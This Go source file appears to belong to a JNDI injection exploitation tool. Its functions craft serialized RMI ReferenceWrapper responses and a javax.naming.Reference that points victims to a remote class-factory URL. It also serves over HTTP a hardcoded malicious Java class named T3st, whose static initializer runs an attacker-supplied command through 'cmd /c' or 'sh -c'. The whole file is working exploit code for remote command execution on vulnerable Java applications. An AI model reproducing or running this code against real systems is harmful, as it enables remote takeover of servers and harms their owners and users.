package tools

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
)

func Getrmires(ip string, port int) []byte {
	var res bytes.Buffer
	// 当IP为11位时，类的域长度为52，且该对象只有IP的所占字节数是可变的，因此计算长度差距即可
	var hexlen string
	if len(ip) >= 11 {
		l := len(ip) - 11
		hexlen = fmt.Sprintf("%X", 52+l)
	} else {
		l := 11 - len(ip)
		hexlen = fmt.Sprintf("%X", 52-l)
	}
	// 当IP为11位时，类的域长度为52，且该对象只有IP的所占字节数是可变的，因此计算长度差距即可
	hexdata := "51aced0005770f0148aef78f0000018770ac4ed880087372002f636f6d2e73756e2e6a6e64692e726d692e72656769737472792e5265666572656e6365577261707065725f537475620000000000000002020000707872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000070787077" + hexlen + "000a556e6963617374526566000b3139322e3136382e312e330000e75076c897a3101d88c648aef78f0000018770ac4ed880010178"
	data, _ := hex.DecodeString(hexdata)
	datalen := len(data)
	predata := data[0 : datalen-40]
	enddata := data[datalen-24:]
	port1 := uint16(port)
	p1 := byte(port1 >> 8)   // 高八位
	p2 := byte(port1 & 0xff) // 低八位
	res.Write(predata)
	res.WriteByte(byte(len(ip)))
	res.WriteString(ip)
	res.Write([]byte{0, 0})
	res.WriteByte(p1)
	res.WriteByte(p2)
	res.Write(enddata)
	return res.Bytes()
}

//rmi响应包，带一个Remote对象，可以自定义IP和端口

func Getclasslocation(ip string, port string, classname string) []byte {
	CL := len(classname)
	url := "http://" + ip + ":" + port + "/"
	UL := len(url)
	var buff bytes.Buffer
	s, _ := hex.DecodeString("51aced0005770f01bdf2f0ef0000018773b115528004737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00024c0009636c6173734e616d6571007e0002707870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b7078700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c0200007078700000000a70707070707070707070787400044576696c74001a687474703a2f2f3139322e3136382e3232392e333a383030302f71007e0009")
	dl := len(s)
	predata := s[:dl-39]
	buff.Write(predata)
	buff.WriteByte(byte(CL))
	buff.Write([]byte(classname))
	buff.WriteByte(byte(116))
	buff.WriteByte(byte(00))
	buff.WriteByte(byte(UL))
	buff.Write([]byte(url))
	buff.Write([]byte{0x71, 0x00, 0x7e, 0x00, 0x09})
	return buff.Bytes()
}

func GethttpEvilClass(cmd string) []byte {
	s := "cafebabe0000003400430a0014002108002209001300230800240a002500260a000a00270800280a000a00290a002a002b07002c08001508002d0a002a002e08002f0800300700310700320a00110033070034070035010003636d640100124c6a6176612f6c616e672f537472696e673b0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100083c636c696e69743e01000d537461636b4d61705461626c6507002c07003101000a536f7572636546696c65010009543373742e6a6176610c0017001801000463616c630c001500160100076f732e6e616d650700360c003700380c0039003a01000377696e0c003b003c07003d0c003e003f0100106a6176612f6c616e672f537472696e670100022f630c0040004101000273680100022d630100136a6176612f696f2f494f457863657074696f6e01001a6a6176612f6c616e672f52756e74696d65457863657074696f6e0c00170042010004543373740100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010028285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b010018284c6a6176612f6c616e672f5468726f7761626c653b29560021001300140000000100080015001600000002000100170018000100190000001d00010001000000052ab70001b100000001001a000000060001000000020008001b001800010019000000b4000500010000005e1202b300031204b80005b600064b2a1207b60008990021b8000906bd000a5903120b535904120c535905b2000353b6000d57a7001eb8000906bd000a5903120e535904120f535905b2000353b6000d57a7000d4bbb0011592ab70012bfb1000100050050005300100002001a0000002600090000000300050006000e0007001700080035000a0050000e0053000c0054000d005d000f001c000000100004fc003507001dfa001a4207001e090001001f000000020020"
	data, _ := hex.DecodeString(s)
	var header bytes.Buffer
	var body bytes.Buffer
	header.WriteString("HTTP/1.1 200 OK\r\n")
	header.WriteString("Content-Length: ")
	cl := len(cmd)
	body.Write(data[:217])
	body.WriteByte(byte(cl >> 8))
	body.WriteByte(byte(cl & 0xff))
	body.WriteString(cmd)
	body.Write(data[223:])
	var http bytes.Buffer
	dl := strconv.Itoa(body.Len())
	header.WriteString(dl)
	header.WriteString("\r\n")
	header.WriteString("\r\n")
	http.Write(header.Bytes())
	http.Write(body.Bytes())
	//fmt.Println(hex.EncodeToString(body.Bytes()))
	return http.Bytes()
}

func GethttpEvilClassfromfile(path string) []byte {
	data, err := os.ReadFile(path)
	if err != nil {
		panic("文件没有权限读取")
	}
	var buf bytes.Buffer
	buf.WriteString("HTTP/1.1 200 OK\r\n")
	buf.WriteString("Content-Length: ")
	dl := strconv.Itoa(len(data))
	buf.WriteString(dl)
	buf.WriteString("\r\n")
	buf.WriteString("\r\n")
	buf.Write(data)
	return buf.Bytes()
}
